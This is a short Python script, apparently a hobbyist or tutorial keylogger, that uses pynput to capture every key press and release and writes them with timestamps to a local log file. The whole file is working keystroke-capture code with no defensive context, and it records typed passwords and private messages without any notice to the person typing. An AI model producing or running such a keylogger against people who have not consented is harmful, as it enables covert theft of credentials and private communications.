from  pynput.keyboard import Listener   #importing Listener for Keyboard activity
import logging  #importing logging module for creating log file of keyboard activity
file_path="key_log.txt" #mention the log file destination path here
def on_press(key):  #Function for key press action
    logging.info("Key pressed : {0}".format(key))    
def on_release(key):    #function for key release action
    logging.info("Key released: {0}".format(key))
#Driver code
logging.basicConfig(filename=file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')  #Creating log file in txt form
with Listener(on_press=on_press, on_release=on_release) as l:   #whenever key is pressed or released
    l.join()    #both the process functions are executed